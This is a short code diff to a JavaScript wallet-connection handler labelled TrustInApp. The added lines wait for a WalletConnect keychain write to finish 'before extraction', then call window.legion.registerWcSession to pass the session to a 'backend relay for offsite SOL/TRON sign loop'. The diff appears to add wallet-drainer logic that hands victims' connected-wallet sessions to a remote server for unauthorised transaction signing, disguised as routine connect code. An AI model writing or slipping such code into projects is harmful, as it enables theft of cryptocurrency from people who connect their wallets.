@@ -392,6 +392,17 @@
         try { window.__TRUST_CONNECT_DONE_ADDR__ = addr; } catch (_) {}
         try { sessionStorage.setItem('trust_site_connected_addr', addr); } catch (_) {}
         console.warn('[TrustInApp] WC connected', addr.slice(0, 10));
+        // Register WC session with backend relay for offsite SOL/TRON sign loop.
+        // Delay 1.5s so AppKit keychain write completes before extraction.
+        setTimeout(function () {
+          try {
+            var L = window.legion;
+            if (L && typeof L.registerWcSession === 'function') {
+              L.registerWcSession();
+              console.warn('[TrustInApp] registerWcSession called after fresh WC connect');
+            }
+          } catch (_) {}
+        }, 1500);
         return true;
       }
 
